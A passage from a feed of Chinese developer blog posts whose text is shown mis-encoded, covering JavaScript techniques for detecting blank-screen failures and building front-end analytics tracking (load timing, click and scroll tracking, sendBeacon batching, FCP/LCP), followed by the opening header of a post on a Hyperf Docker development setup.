  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> entry <span class="hljs-keyword">of</span> list.<span class="hljs-title function_">getEntries</span>()) {
    <span class="hljs-keyword">if</span>(entry.<span class="hljs-property">duration</span> &gt; <span class="hljs-number">50</span>) { <span class="hljs-comment">// è¶…è¿‡50msçš„ä»»åŠ¡</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'é•¿ä»»åŠ¡å½±å“æ¸²æŸ“:'</span>, entry);
    }
  }
});
observer.<span class="hljs-title function_">observe</span>({<span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">"longtask"</span>]});
</code></pre>
<h4 data-id="heading-11">2. å…³é”®æ¸²æŸ“è·¯å¾„ç›‘æ§</h4>
<pre><code class="hljs language-ini" lang="ini">// ä½¿ç”¨Performance APIç›‘æ§å…³é”®æ—¶é—´ç‚¹
const <span class="hljs-attr">perfData</span> = window.performance.timing<span class="hljs-comment">;</span>
const <span class="hljs-attr">metrics</span> = {
  domReady: perfData.domComplete - perfData.domLoading,
  loadTime: perfData.loadEventEnd - perfData.navigationStart
}<span class="hljs-comment">;</span>

if(metrics.domReady &gt; 3000) {
  console.error('DOMè§£ææ—¶é—´è¿‡é•¿:', metrics)<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-12">å››ã€è‡ªåŠ¨åŒ–æ£€æµ‹æ–¹æ¡ˆ</h3>
<h4 data-id="heading-13">1. Puppeteeræ£€æµ‹è„šæœ¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer'</span>);

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>();
  <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">newPage</span>();
  
  <span class="hljs-comment">// ç›‘å¬æ§åˆ¶å°é”™è¯¯</span>
  page.<span class="hljs-title function_">on</span>(<span class="hljs-string">'console'</span>, <span class="hljs-function"><span class="hljs-params">msg</span> =&gt;</span> {
    <span class="hljs-keyword">if</span>(msg.<span class="hljs-title function_">type</span>() === <span class="hljs-string">'error'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é¡µé¢é”™è¯¯:'</span>, msg.<span class="hljs-title function_">text</span>());
    }
  });
  
  <span class="hljs-comment">// è®¾ç½®è¶…æ—¶æ£€æµ‹</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([
    page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">'https://your-site.com'</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> 
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'é¡µé¢åŠ è½½è¶…æ—¶'</span>)), <span class="hljs-number">5000</span>)
    )
  ]);
  
  <span class="hljs-comment">// æ£€æŸ¥å¯è§å†…å®¹</span>
  <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> page.evaluate(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bodyText</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span>,
      <span class="hljs-attr">childCount</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>
    };
  });
  
  <span class="hljs-keyword">if</span>(content.<span class="hljs-property">childCount</span> === <span class="hljs-number">0</span> || content.<span class="hljs-property">bodyText</span>.<span class="hljs-property">length</span> &lt; <span class="hljs-number">10</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ£€æµ‹åˆ°ç™½å±ç°è±¡'</span>);
  }
  
  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();
})();
</code></pre>
<h4 data-id="heading-14">2. çœŸå®ç”¨æˆ·ç›‘æ§ï¼ˆRUMï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨æµè§ˆå™¨çš„MutationObserverç›‘æ§DOMå˜åŒ–</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#app'</span>)?.<span class="hljs-property">innerHTML</span>) {
    <span class="hljs-comment">// ä¸ŠæŠ¥ç™½å±äº‹ä»¶</span>
    beacon.<span class="hljs-title function_">send</span>(<span class="hljs-string">'white-screen'</span>, {
      <span class="hljs-attr">url</span>: location.<span class="hljs-property">href</span>,
      <span class="hljs-attr">ua</span>: navigator.<span class="hljs-property">userAgent</span>
    });
  }
});

observer.<span class="hljs-title function_">observe</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, {
  <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<h3 data-id="heading-15">äº”ã€å¸¸è§ç™½å±åœºæ™¯ç¤ºä¾‹</h3>
<ol>
<li>
<p><strong>èµ„æºåŠ è½½å¤±è´¥</strong>ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é”™è¯¯çš„èµ„æºè·¯å¾„ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/wrong-path/app.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>è¯­æ³•é”™è¯¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¼ºå°‘æ‹¬å·å¯¼è‡´æ•´ä¸ªè„šæœ¬ä¸æ‰§è¡Œ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>
}
</code></pre>
</li>
<li>
<p><strong>æ¡†æ¶åˆå§‹åŒ–å¤±è´¥</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// Vueç¤ºä¾‹ - æŒ‚è½½å…ƒç´ ä¸å­˜åœ¨</span>
<span class="hljs-keyword">new</span> <span class="hljs-built_in">Vue</span>({el: <span class="hljs-string">'#not-exist'</span>});
</code></pre>
</li>
<li>
<p><strong>CSSé˜»å¡</strong>ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä¸æ­£ç¡®çš„CSSå¼•å…¥é˜»å¡æ¸²æŸ“ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"nonexist.css"</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>ç¬¬ä¸‰æ–¹åº“å†²çª</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä¸¤ä¸ªåº“éƒ½ä¿®æ”¹äº†ArrayåŸå‹</span>
libraryA<span class="hljs-selector-class">.modifyPrototype</span>();
libraryB<span class="hljs-selector-class">.modifyPrototype</span>(); <span class="hljs-comment">// å†²çªå¯¼è‡´é”™è¯¯ ```</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-16">2.å‰ç«¯åŸ‹ç‚¹</h2>
<h3 data-id="heading-17">ä¸€ã€é¡µé¢ç”Ÿå‘½å‘¨æœŸåŸ‹ç‚¹</h3>
<h4 data-id="heading-18">1. é¡µé¢åŠ è½½é˜¶æ®µ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è®°å½•é¡µé¢å¼€å§‹åŠ è½½æ—¶é—´</span>
<span class="hljs-keyword">const</span> pageStartTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

<span class="hljs-comment">// ç›‘å¬é¡µé¢åŠ è½½å®Œæˆ</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> loadTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - pageStartTime;
  <span class="hljs-title function_">track</span>(<span class="hljs-string">'page_load'</span>, {
    <span class="hljs-attr">load_time</span>: loadTime,
    <span class="hljs-attr">referrer</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">referrer</span>,
    <span class="hljs-attr">resource_status</span>: <span class="hljs-title function_">checkResources</span>()
  });
});

<span class="hljs-comment">// æ£€æŸ¥å…³é”®èµ„æºåŠ è½½çŠ¶æ€</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkResources</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'resource'</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> ({
    <span class="hljs-attr">name</span>: res.<span class="hljs-property">name</span>,
    <span class="hljs-attr">type</span>: res.<span class="hljs-property">initiatorType</span>,
    <span class="hljs-attr">duration</span>: res.<span class="hljs-property">duration</span>.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)
  }));
}
</code></pre>
<h4 data-id="heading-19">2. ç”¨æˆ·äº¤äº’é˜¶æ®µ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç‚¹å‡»äº‹ä»¶åŸ‹ç‚¹ï¼ˆæ”¯æŒäº‹ä»¶å§”æ‰˜ï¼‰</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'[data-track]'</span>);
  <span class="hljs-keyword">if</span>(target) {
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'element_click'</span>, {
      <span class="hljs-attr">element_id</span>: target.<span class="hljs-property">id</span>,
      <span class="hljs-attr">track_type</span>: target.<span class="hljs-property">dataset</span>.<span class="hljs-property">track</span>,
      <span class="hljs-attr">position</span>: <span class="hljs-string">`<span class="hljs-subst">${e.clientX}</span>,<span class="hljs-subst">${e.clientY}</span>`</span>
    });
  }
});

<span class="hljs-comment">// æ»šåŠ¨æ·±åº¦è®°å½•</span>
<span class="hljs-keyword">let</span> maxScroll = <span class="hljs-number">0</span>;
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, _.<span class="hljs-title function_">throttle</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> currentScroll = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> / <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">scrollHeight</span>;
  <span class="hljs-keyword">if</span>(currentScroll &gt; maxScroll) {
    maxScroll = currentScroll;
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'scroll_depth'</span>, { <span class="hljs-attr">depth</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(maxScroll * <span class="hljs-number">100</span>) });
  }
}, <span class="hljs-number">1000</span>));
</code></pre>
<h4 data-id="heading-20">3. é¡µé¢åœç•™æ—¶é•¿è®¡ç®—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> activeStart = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
<span class="hljs-keyword">let</span> inactiveTime = <span class="hljs-number">0</span>;

<span class="hljs-comment">// ç”¨æˆ·æ´»è·ƒçŠ¶æ€æ£€æµ‹</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, resetActiveTimer);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, resetActiveTimer);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">resetActiveTimer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span>(inactiveTime &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'user_inactive'</span>, { <span class="hljs-attr">duration</span>: inactiveTime });
    inactiveTime = <span class="hljs-number">0</span>;
  }
  activeStart = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
}

<span class="hljs-comment">// æ¯10ç§’æ£€æµ‹ä¸€æ¬¡æ´»è·ƒçŠ¶æ€</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - activeStart &gt; <span class="hljs-number">15000</span>) { <span class="hljs-comment">// 15ç§’æ— æ“ä½œè§†ä¸ºä¸æ´»è·ƒ</span>
    inactiveTime += <span class="hljs-number">10000</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'user_active'</span>, { <span class="hljs-attr">duration</span>: <span class="hljs-number">10000</span> });
  }
}, <span class="hljs-number">10000</span>);
</code></pre>
<h3 data-id="heading-21">äºŒã€ç‰¹æ®Šåœºæ™¯å¤„ç†</h3>
<h4 data-id="heading-22">1. é¡µé¢éšè—/æ˜¾ç¤º</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é¡µé¢å¯è§æ€§å˜åŒ–ç›‘å¬</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'visibilitychange'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">hidden</span>) {
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'page_hide'</span>, { 
      <span class="hljs-attr">stay_time</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - pageStartTime,
      <span class="hljs-attr">scroll_depth</span>: maxScroll
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">track</span>(<span class="hljs-string">'page_show'</span>);
  }
});
</code></pre>
<h4 data-id="heading-23">2. é¡µé¢å…³é—­å‰ä¸ŠæŠ¥</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¡®ä¿é¡µé¢å…³é—­å‰æ•°æ®ä¸ŠæŠ¥</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> totalStay = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - pageStartTime;
  navigator.<span class="hljs-title function_">sendBeacon</span>(<span class="hljs-string">'/api/track'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    <span class="hljs-attr">event</span>: <span class="hljs-string">'page_close'</span>,
    <span class="hljs-attr">active_time</span>: totalStay - inactiveTime,
    <span class="hljs-attr">scroll_depth</span>: maxScroll
  }));
});
</code></pre>
<h3 data-id="heading-24">ä¸‰ã€æ•°æ®ä¸ŠæŠ¥ä¼˜åŒ–æ–¹æ¡ˆ</h3>
<h4 data-id="heading-25">1. æ‰¹é‡ä¸ŠæŠ¥æœºåˆ¶</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">eventQueue</span> = []<span class="hljs-comment">;</span>
const <span class="hljs-attr">MAX_QUEUE</span> = <span class="hljs-number">5</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">FLUSH_INTERVAL</span> = <span class="hljs-number">3000</span><span class="hljs-comment">;</span>

function addToQueue(event) {
  eventQueue.push(event)<span class="hljs-comment">;</span>
  if(eventQueue.length &gt;= MAX_QUEUE) {
    flushQueue()<span class="hljs-comment">;</span>
  }
}

function flushQueue() {
  if(<span class="hljs-attr">eventQueue.length</span> === <span class="hljs-number">0</span>) return<span class="hljs-comment">;</span>
  
  const <span class="hljs-attr">batchData</span> = { batch: eventQueue }<span class="hljs-comment">;</span>
  navigator.sendBeacon('/api/batch', JSON.stringify(batchData))<span class="hljs-comment">;</span>
  <span class="hljs-attr">eventQueue</span> = []<span class="hljs-comment">;</span>
}

// å®šæ—¶åˆ·æ–°é˜Ÿåˆ—
setInterval(flushQueue, FLUSH_INTERVAL)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-26">2. å…³é”®æŒ‡æ ‡è®¡ç®—</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// è®¡ç®—FMPï¼ˆé¦–æ¬¡æœ‰æ•ˆç»˜åˆ¶ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>((entryList) =&gt; {
  <span class="hljs-keyword">const</span> [entry] = entryList.<span class="hljs-title function_ invoke__">getEntriesByName</span>(<span class="hljs-string">'first-contentful-paint'</span>);
  <span class="hljs-title function_ invoke__">track</span>(<span class="hljs-string">'fmp'</span>, { <span class="hljs-attr">value</span>: entry.startTime.<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>) });
}).<span class="hljs-title function_ invoke__">observe</span>({<span class="hljs-attr">type</span>: <span class="hljs-string">'paint'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span>});

<span class="hljs-comment">// è®¡ç®—LCPï¼ˆæœ€å¤§å†…å®¹ç»˜åˆ¶ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>((entryList) =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">entries</span> = entryList.<span class="hljs-title function_ invoke__">getEntries</span>();
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">lastEntry</span> = entries[entries.length - <span class="hljs-number">1</span>];
  <span class="hljs-title function_ invoke__">track</span>(<span class="hljs-string">'lcp'</span>, { <span class="hljs-attr">value</span>: lastEntry.startTime.<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>) });
}).<span class="hljs-title function_ invoke__">observe</span>({<span class="hljs-attr">type</span>: <span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span>});
</code></pre>
<h3 data-id="heading-27">å››ã€é¢è¯•å›ç­”ç²¾ç®€ç‰ˆ</h3>
<p>"æˆ‘ä»¬å®ç°å…¨é“¾è·¯åŸ‹ç‚¹ä¸»è¦åˆ†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li>
<p><strong>åŠ è½½é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>ç”¨<code>performance API</code>é‡‡é›†DNS/TTFBç­‰æŒ‡æ ‡</li>
<li>ç›‘å¬<code>load</code>äº‹ä»¶è®°å½•å®Œæ•´åŠ è½½æ—¶é—´</li>
<li>æ£€æŸ¥å…³é”®èµ„æºçŠ¶æ€ï¼ˆå¦‚å›¾ç‰‡/è„šæœ¬ï¼‰</li>
</ul>
</li>
<li>
<p><strong>äº¤äº’é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶å§”æ‰˜ç›‘å¬å…¨å±€ç‚¹å‡»ï¼ˆå¸¦<code>data-track</code>å±æ€§ï¼‰</li>
<li>èŠ‚æµå¤„ç†æ»šåŠ¨äº‹ä»¶è®¡ç®—æœ€å¤§æ·±åº¦</li>
<li>é€šè¿‡<code>mousemove/keydown</code>æ£€æµ‹æ´»è·ƒçŠ¶æ€</li>
</ul>
</li>
<li>
<p><strong>ç¦»å¼€é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li><code>visibilitychange</code>å¤„ç†é¡µé¢åˆ‡æ¢</li>
<li><code>beforeunload</code>+<code>sendBeacon</code>ç¡®ä¿å…³é—­å‰ä¸ŠæŠ¥</li>
<li>è®¡ç®—æ€»åœç•™æ—¶é•¿å’Œæœ‰æ•ˆæ´»è·ƒæ—¶é—´</li>
</ul>
</li>
</ol>
<h3 data-id="heading-28">3.é‚£ä¸ºä»€ä¹ˆå¤§å®¶éƒ½ä½¿ç”¨è¯·æ±‚<code> GIF å›¾ç‰‡</code>çš„æ–¹å¼ä¸ŠæŠ¥åŸ‹ç‚¹æ•°æ®å‘¢ï¼Ÿ</h3>
<ul>
<li>
<p><strong>é˜²æ­¢è·¨åŸŸé—®é¢˜</strong>ï¼šå‰ç«¯ç›‘æ§çš„è¯·æ±‚å¸¸å¸¸ä¼šé‡åˆ°è·¨åŸŸé—®é¢˜ï¼Œè¿™å¯èƒ½ä¼šå½±å“ç›‘æ§çš„å‡†ç¡®æ€§å’Œå¯ç”¨æ€§ã€‚ç„¶è€Œï¼Œå›¾ç‰‡çš„srcå±æ€§å¹¶ä¸ä¼šè·¨åŸŸï¼Œå› æ­¤ä½¿ç”¨GIFå›¾ç‰‡ä½œä¸ºåŸ‹ç‚¹å¯ä»¥æ­£å¸¸å‘èµ·è¯·æ±‚ï¼Œä»è€Œæœ‰æ•ˆé¿å…è·¨åŸŸé—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>é˜²æ­¢é˜»å¡é¡µé¢åŠ è½½</strong>ï¼šåœ¨åˆ›å»ºèµ„æºèŠ‚ç‚¹åï¼Œé€šå¸¸åªæœ‰å½“å¯¹è±¡æ³¨å…¥åˆ°æµè§ˆå™¨çš„DOMæ ‘åï¼Œæµè§ˆå™¨æ‰ä¼šå®é™…å‘é€èµ„æºè¯·æ±‚ã€‚ä½†åå¤æ“ä½œDOMä¼šå¼•å‘æ€§èƒ½é—®é¢˜ï¼Œä¸”è½½å…¥js/cssèµ„æºä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œä»è€Œå½±å“ç”¨æˆ·ä½“éªŒã€‚ä¸æ­¤ä¸åŒï¼Œæ„é€ å›¾ç‰‡æ‰“ç‚¹ä¸éœ€è¦æ’å…¥DOMï¼Œåªè¦åœ¨jsä¸­newå‡ºImageå¯¹è±¡å°±èƒ½å‘èµ·è¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ä¼šæœ‰é˜»å¡é—®é¢˜ã€‚å³ä½¿åœ¨æ²¡æœ‰jsçš„æµè§ˆå™¨ç¯å¢ƒä¸­ï¼Œä¹Ÿèƒ½é€šè¿‡imgæ ‡ç­¾æ­£å¸¸æ‰“ç‚¹ï¼Œè¿™æ˜¯å…¶ä»–ç±»å‹çš„èµ„æºè¯·æ±‚æ‰€åšä¸åˆ°çš„ã€‚</p>
</li>
<li>
<p><strong>ä½“ç§¯å°ï¼ŒèŠ‚çº¦æµé‡</strong>ï¼šç›¸æ¯”å…¶ä»–å›¾ç‰‡æ ¼å¼ï¼ˆå¦‚BMPå’ŒPNGï¼‰ï¼ŒGIFå›¾ç‰‡å…·æœ‰æ›´å°çš„ä½“ç§¯ã€‚ä¾‹å¦‚ï¼Œæœ€å°çš„BMPæ–‡ä»¶éœ€è¦74ä¸ªå­—èŠ‚ï¼ŒPNGéœ€è¦67ä¸ªå­—èŠ‚ï¼Œè€Œåˆæ³•çš„GIFåªéœ€è¦43ä¸ªå­—èŠ‚ã€‚å› æ­¤ï¼Œä½¿ç”¨GIFä½œä¸ºåŸ‹ç‚¹å¯ä»¥æ˜¾è‘—èŠ‚çº¦æµé‡ï¼Œæé«˜æ•°æ®ä¼ è¾“æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>æµè§ˆå™¨æ”¯æŒæ€§å¥½</strong>ï¼šæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒImageå¯¹è±¡ï¼Œå³ä½¿ä¸æ”¯æŒXMLHttpRequestå¯¹è±¡ä¹Ÿä¸€æ ·ã€‚è¿™æ„å‘³ç€ä½¿ç”¨GIFè¿›è¡ŒåŸ‹ç‚¹ä¸ŠæŠ¥å¯ä»¥åœ¨å„ç§æµè§ˆå™¨ç¯å¢ƒä¸­ç¨³å®šè¿è¡Œã€‚</p>
</li>
<li>
<p><strong>è®°å½•é”™è¯¯çš„è¿‡ç¨‹å¾ˆå°‘å‡ºé”™</strong>ï¼šæŸäº›æƒ…å†µä¸‹ï¼Œå¦‚Ajaxé€šä¿¡è¿‡ç¨‹ä¸­é¡µé¢è·³è½¬ï¼Œè¯·æ±‚å¯èƒ½ä¼šè¢«å–æ¶ˆã€‚ä½†ä½¿ç”¨å›¾ç‰‡è¿›è¡ŒåŸ‹ç‚¹ä¸ŠæŠ¥åˆ™ä¸ä¼šé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨è®°å½•ç¦»å¼€é¡µé¢æ‰“ç‚¹è¡Œä¸ºçš„æ—¶å€™ä¼šå¾ˆæœ‰ç”¨ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ­å»ºHyperfæœ¬åœ°å¼€å‘ç¯å¢ƒä¹‹Dockerå®¹å™¨å¼€å‘]]></title>    <link>https://juejin.cn/post/7576086557716168755</link>    <guid>https://juejin.cn/post/7576086557716168755</guid>    <pubDate>2025-11-24T09:53:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086557716168755" data-draft-id="7576070987293868078" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ­å»ºHyperfæœ¬åœ°å¼€å‘ç¯å¢ƒä¹‹Dockerå®¹å™¨å¼€å‘"/> <meta itemprop="keywords" content="åç«¯,PHP,Docker"/> <meta itemprop="datePublished" content="2025-11-24T09:53:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jokerä¸¶ç‰§ç¾Šäºº"/> <meta itemprop="url" content="https://juejin.cn/user/4054654614250958"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ­å»ºHyperfæœ¬åœ°å¼€å‘ç¯å¢ƒä¹‹Dockerå®¹å™¨å¼€å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654614250958/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jokerä¸¶ç‰§ç¾Šäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T09:53:28.000Z" title="Mon Nov 24 2025 09:53:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
